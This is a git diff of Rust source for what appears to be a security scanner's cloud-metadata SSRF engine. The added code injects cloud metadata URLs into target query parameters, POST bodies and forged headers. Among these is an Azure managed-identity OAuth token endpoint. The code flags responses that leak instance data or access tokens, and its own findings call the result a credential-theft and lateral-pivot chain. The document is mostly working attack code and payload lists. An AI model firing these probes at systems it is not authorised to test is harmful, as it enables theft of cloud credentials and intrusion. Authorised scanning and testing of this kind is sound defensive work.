@@ -1,15 +1,17 @@
 //! Advanced Cloud Engines — real HTTP probes against cloud-metadata endpoints, S3-style buckets,
 //! and SaaS APIs reachable from the target. No simulated findings.
 
+use crate::engine_dispatch::EngineRunContext;
 use crate::engine_probes::{
     detect_secrets, dns_a, dns_mx, dns_ns, dns_txt, empty_ok, extract_host, finding_with_probe_depth,
-    header_value, http_client, http_get, http_post_json, normalize_url, probe_paths_concurrent,
-    DEFAULT_PROBE_CONCURRENCY,
+    header_value, http_client, http_get, http_get_with_headers, http_post_json, normalize_url,
+    probe_paths_concurrent, DEFAULT_PROBE_CONCURRENCY,
 };
 use crate::engine_result::{print_result, EngineResult};
-use serde_json::Value;
+use serde_json::{json, Value};
 
 const CLOUD_PROBE_DEPTH: &str = "cloud_remote_surface";
+const ENGINE_METADATA_SSRF: &str = "cloud_metadata_ssrf";
 
 fn cloud_finding(
     engine_id: &str,
@@ -30,6 +32,99 @@ fn cloud_finding(
     )
 }
 
+fn cloud_finding_sync(
+    engine_id: &str,
+    title: &str,
+    severity: &str,
+    mitre: &str,
+    description: &str,
+    target: &str,
+    correlation_hints: &[&str],
+    feeds_engines: &[&str],
+    metadata: Value,
+) -> Value {
+    let mut f = cloud_finding(engine_id, title, severity, mitre, description, target);
+    if let Some(obj) = f.as_object_mut() {
+        obj.insert(
+            "correlation_hints".into(),
+            Value::Array(correlation_hints.iter().map(|s| json!(*s)).collect()),
+        );
+        obj.insert(
+            "feeds_engines".into(),
+            Value::Array(feeds_engines.iter().map(|s| json!(*s)).collect()),
+        );
+        if !metadata.is_null() {
+            obj.insert("sync_metadata".into(), metadata);
+        }
+    }
+    f
+}
+
+fn metadata_body_hit(body: &str) -> Option<&'static str> {
+    if body.contains("ami-id") || body.contains("instance-id") {
+        return Some("aws");
+    }
+    if body.contains("computeMetadata") {
+        return Some("gcp");
+    }
+    if body.contains("instanceId") || body.contains("access_token") {
+        return Some("azure");
+    }
+    if body.contains("droplet") || body.contains("region") && body.contains("digitalocean") {
+        return Some("digitalocean");
+    }
+    None
+}
+
+fn ssrf_metadata_urls() -> Vec<&'static str> {
+    vec![
+        "http://169.254.169.254/latest/meta-data/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+        "http://169.254.169.254/openstack/latest/meta_data.json",
+        "http://100.100.100.200/latest/meta-data/",
+    ]
+}
+
+fn ssrf_param_keys() -> Vec<&'static str> {
+    vec![
+        "url",
+        "image",
+        "callback",
+        "redirect_uri",
+        "target",
+        "fetch",
+        "dest",
+        "link",
+        "src",
+        "uri",
+        "path",
+        "next",
+    ]
+}
+
+fn ssrf_probe_bases(target: &str, ctx: &EngineRunContext) -> Vec<String> {
+    let root = normalize_url(target);
+    let mut bases = vec![root.clone()];
+    for p in &ctx.discovered_paths {
+        bases.push(format!("{}{}", root.trim_end_matches('/'), p));
+    }
+    if let Some(bus) = ctx.intelligence_bus.as_ref() {
+        for art in bus.snapshot() {
+            if art.proof.starts_with("http_surface_")
+                || art.proof.starts_with("graphql_")
+                || art.kind.contains("gateway")
+            {
+                bases.push(art.source_url.clone());
+            }
+        }
+    }
+    bases.sort();
+    bases.dedup();
+    bases
+}
+
 macro_rules! cli_wrapper {
     ($name:ident, $result_fn:ident) => {
         pub async fn $name(target: &str) {
@@ -38,80 +133,218 @@ macro_rules! cli_wrapper {
     };
 }
 
-// Probe SSRF-forwarded cloud metadata via target (GET query + POST body).
-async fn try_ssrf_metadata(target: &str) -> Vec<Value> {
+fn cloud_auth_header_pairs(params: &Value) -> Vec<(String, String)> {
+    let mut pairs = Vec::new();
+    if let Some(token) = params
+        .get("bearer_token")
+        .or_else(|| params.get("options").and_then(|o| o.get("bearer_token")))
+        .and_then(|v| v.as_str())
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+    {
+        pairs.push((
+            "Authorization".into(),
+            if token.starts_with("Bearer ") {
+                token.to_string()
+            } else {
+                format!("Bearer {token}")
+            },
+        ));
+    }
+    crate::ws_intelligence_bus::apply_intelligence_artifacts_to_headers(params, &mut pairs);
+    pairs
+}
+
+#[derive(Default)]
+struct MetadataSsrfFlags {
+    get_hit: bool,
+    post_hit: bool,
+    header_hit: bool,
+    providers: Vec<String>,
+}
+
+// Probe SSRF-forwarded cloud metadata via target (GET query + POST body + headers).
+async fn try_ssrf_metadata_ctx(target: &str, ctx: &EngineRunContext) -> (Vec<Value>, MetadataSsrfFlags) {
     let client = http_client().await;
-    let base = normalize_url(target);
-    let metadata_urls = [
-        "http://169.254.169.254/latest/meta-data/",
-        "http://metadata.google.internal/computeMetadata/v1/",
-        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
-    ];
+    let bases = ssrf_probe_bases(target, ctx);
+    let metadata_urls = ssrf_metadata_urls();
+    let param_keys = ssrf_param_keys();
+    let auth_pairs = cloud_auth_header_pairs(&ctx.job_params);
+    let auth_refs: Vec<(&str, &str)> = auth_pairs
+        .iter()
+        .map(|(k, v)| (k.as_str(), v.as_str()))
+        .collect();
     let mut findings = Vec::new();
-    for meta in metadata_urls.iter() {
-        for q in ["url", "image", "callback", "redirect_uri", "target", "fetch"] {
-            let url = format!(
-                "{}/?{}={}",
-                base.trim_end_matches('/'),
-                q,
-                urlencoding::encode(meta)
-            );
-            if let Some(p) = http_get(&client, &url).await {
-                if p.body.contains("ami-id")
-                    || p.body.contains("computeMetadata")
-                    || p.body.contains("instanceId")
-                    || p.body.contains("access_token")
-                {
-                    findings.push(cloud_finding(
-                        "cloud_metadata_ssrf",
-                        "Cloud metadata reflected via SSRF param",
-                        "critical",
-                        "T1552.005",
-                        &format!(
-                            "?{}={} on {} returned cloud-metadata content.",
-                            q, meta, p.final_url
-                        ),
-                        target,
-                    ));
+    let mut flags = MetadataSsrfFlags::default();
+
+    for base in &bases {
+        for meta in &metadata_urls {
+            for q in &param_keys {
+                let url = format!(
+                    "{}/?{}={}",
+                    base.trim_end_matches('/'),
+                    q,
+                    urlencoding::encode(meta)
+                );
+                let get_probe = if auth_refs.is_empty() {
+                    http_get(&client, &url).await
+                } else {
+                    http_get_with_headers(&client, &url, &auth_refs).await
+                };
+                if let Some(p) = get_probe {
+                    if let Some(provider) = metadata_body_hit(&p.body) {
+                        flags.get_hit = true;
+                        if !flags.providers.iter().any(|x| x == provider) {
+                            flags.providers.push(provider.to_string());
+                        }
+                        if let Some(bus) = ctx.intelligence_bus.as_ref() {
+                            bus.publish_http_surface(
+                                "cloud_metadata_ssrf_get",
+                                meta,
+                                &p.final_url,
+                                ENGINE_METADATA_SSRF,
+                                "http_surface_metadata_ssrf_get",
+                            );
+                        }
+                        findings.push(cloud_finding_sync(
+                            ENGINE_METADATA_SSRF,
+                            "Cloud metadata reflected via SSRF param",
+                            "critical",
+                            "T1552.005",
+                            &format!(
+                                "?{q}={meta} on {} returned {provider} metadata (HTTP {}).",
+                                p.final_url, p.status
+                            ),
+                            target,
+                            &["ssrf_advanced", "api_gateway_bypass", "graphql_deep_attack"],
+                            &["multi_cloud_pivot", "risk_superposition_collapse"],
+                            json!({
+                                "provider": provider,
+                                "param": q,
+                                "transport": "GET",
+                                "endpoint": p.final_url
+                            }),
+                        ));
+                    }
+                }
+                let mut post_map = serde_json::Map::new();
+                post_map.insert((*q).to_string(), json!(*meta));
+                let post_payload = Value::Object(post_map);
+                if let Some(p) = http_post_json(&client, &url, &post_payload).await {
+                    if let Some(provider) = metadata_body_hit(&p.body) {
+                        flags.post_hit = true;
+                        if !flags.providers.iter().any(|x| x == provider) {
+                            flags.providers.push(provider.to_string());
+                        }
+                        if let Some(bus) = ctx.intelligence_bus.as_ref() {
+                            bus.publish_http_surface(
+                                "cloud_metadata_ssrf_post",
+                                meta,
+                                &p.final_url,
+                                ENGINE_METADATA_SSRF,
+                                "http_surface_metadata_ssrf_post",
+                            );
+                        }
+                        findings.push(cloud_finding_sync(
+                            ENGINE_METADATA_SSRF,
+                            "Cloud metadata reflected via POST SSRF body",
+                            "critical",
+                            "T1552.005",
+                            &format!(
+                                "POST body {q}={meta} on {} returned {provider} metadata (HTTP {}).",
+                                p.final_url, p.status
+                            ),
+                            target,
+                            &["ssrf_advanced", "api_mass_assignment"],
+                            &["multi_cloud_pivot", "identity_attack_chain"],
+                            json!({
+                                "provider": provider,
+                                "param": q,
+                                "transport": "POST",
+                                "endpoint": p.final_url
+                            }),
+                        ));
+                    }
                 }
             }
-            let post_payload = serde_json::json!({ q: meta });
-            if let Some(p) = http_post_json(&client, &url, &post_payload).await {
-                if p.body.contains("ami-id")
-                    || p.body.contains("computeMetadata")
-                    || p.body.contains("instanceId")
-                    || p.body.contains("access_token")
-                {
-                    findings.push(cloud_finding(
-                        "cloud_metadata_ssrf",
-                        "Cloud metadata reflected via POST SSRF body",
+        }
+
+        let header_vectors: [(&str, &str); 4] = [
+            ("X-Forwarded-Host", "169.254.169.254"),
+            ("X-Original-URL", "/latest/meta-data/"),
+            ("X-Forwarded-For", "169.254.169.254"),
+            ("Referer", "http://169.254.169.254/latest/meta-data/"),
+        ];
+        for (hdr, val) in header_vectors {
+            if let Some(p) = http_get_with_headers(&client, base, &[(hdr, val)]).await {
+                if let Some(provider) = metadata_body_hit(&p.body) {
+                    flags.header_hit = true;
+                    if !flags.providers.iter().any(|x| x == provider) {
+                        flags.providers.push(provider.to_string());
+                    }
+                    findings.push(cloud_finding_sync(
+                        ENGINE_METADATA_SSRF,
+                        "Cloud metadata via SSRF header vector",
                         "critical",
                         "T1552.005",
                         &format!(
-                            "POST body {}={} on {} returned cloud-metadata content.",
-                            q, meta, p.final_url
+                            "Header {hdr}={val} on {base} returned {provider} metadata (HTTP {}).",
+                            p.status
                         ),
                         target,
+                        &["api_gateway_bypass", "zero_trust_bypass"],
+                        &["external_exposure_supreme"],
+                        json!({"header": hdr, "provider": provider, "endpoint": p.final_url}),
                     ));
                 }
             }
         }
     }
-    findings
+
+    if flags.providers.len() >= 2 || (flags.get_hit && flags.post_hit) {
+        findings.push(cloud_finding_sync(
+            ENGINE_METADATA_SSRF,
+            "Toxic chain: multi-vector cloud metadata SSRF",
+            "critical",
+            "T1552.005",
+            &format!(
+                "Live cloud fusion: providers={:?} get={} post={} header={} — credential theft / lateral pivot chain.",
+                flags.providers, flags.get_hit, flags.post_hit, flags.header_hit
+            ),
+            target,
+            &["multi_cloud_pivot", "lambda_escape", "kubernetes_rbac_escape"],
+            &["threat_surface_intelligence_fusion", "risk_superposition_collapse"],
+            json!({"toxic_chain": true, "providers": flags.providers}),
+        ));
+    }
+
+    (findings, flags)
 }
 
 // ── cloud_metadata_ssrf ───────────────────────────────────────────────────────
 pub async fn run_cloud_metadata_ssrf_result(target: &str) -> EngineResult {
+    run_cloud_metadata_ssrf_result_ctx(target, &EngineRunContext::default()).await
+}
+
+pub async fn run_cloud_metadata_ssrf_result_ctx(
+    target: &str,
+    ctx: &EngineRunContext,
+) -> EngineResult {
     if target.trim().is_empty() {
         return EngineResult::error("target required");
     }
-    let findings = try_ssrf_metadata(target).await;
+    let (findings, flags) = try_ssrf_metadata_ctx(target, ctx).await;
     if findings.is_empty() {
-        empty_ok("cloud_metadata_ssrf", target)
+        empty_ok(ENGINE_METADATA_SSRF, target)
     } else {
         let n = findings.len();
-        EngineResult::ok(findings, format!("cloud_metadata_ssrf: {} hit(s)", n))
+        EngineResult::ok(
+            findings,
+            format!(
+                "{ENGINE_METADATA_SSRF}: {n} hit(s) (providers={:?})",
+                flags.providers
+            ),
+        )
     }
 }
 cli_wrapper!(run_cloud_metadata_ssrf, run_cloud_metadata_ssrf_result);
